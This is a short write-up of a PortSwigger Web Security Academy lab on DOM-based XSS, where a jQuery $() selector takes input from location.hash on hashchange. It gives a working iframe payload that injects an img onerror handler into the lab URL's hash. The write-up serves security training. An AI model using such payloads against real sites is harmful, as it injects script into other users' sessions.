# DOM XSS in jQuery Selector Using Hashchange Event Lab

This project documents a PortSwigger Web Security Academy lab demonstrating a DOM-based Cross-Site Scripting (XSS) vulnerability caused by a jQuery selector using user-controlled data from `location.hash`.

## Lab Information

- **Vulnerability:** DOM-based Cross-Site Scripting (XSS)
- **Sink:** jQuery `$()` selector
- **Source:** `location.hash`
- **Trigger:** `hashchange` event
- **Difficulty:** Apprentice
- **Status:** Solved
- **Target Function:** Home page auto-scroll functionality

## Payload Used

```html
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>
